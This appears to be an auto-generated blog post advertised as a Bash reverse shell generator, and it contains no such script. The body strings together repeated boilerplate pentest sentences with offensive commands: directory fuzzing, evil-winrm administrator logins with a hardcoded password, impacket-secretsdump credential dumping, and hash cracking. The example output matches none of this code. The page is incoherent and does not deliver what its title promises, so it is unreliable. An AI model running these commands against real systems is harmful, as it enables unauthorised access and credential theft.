---
TitleSEO: "Reverse Shell Generator in Bash | ZureFX"
TitlePost: "Reverse Shell Generator — Bash"
Author: "ZureFX"
Description: "A Bash script for reverse shell generator. Built for security research and automation."
Keywords: "automation, scanner, powershell, bash"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-821.html"
URL_IMAGES: ""
Date: "2024-01-05"
Tags: "Automation, Scanner, PowerShell, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-821"
Permalink: "/scripting/script-reverse-shell-generator-821.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `evil-winrm`
- `dcomexec`
- `crackmapexec`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.96.139.61/FUZZ
gobuster dir -u http://10.81.243.245/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.36.75.9 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.34.227.43
nmap -sCV -p3389,27017,143 10.102.12.50 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.89.61
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.36.54.168 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.95.8.129/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.52.187.235/FUZZ
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 19 results
[+] Done in 18.42s
```
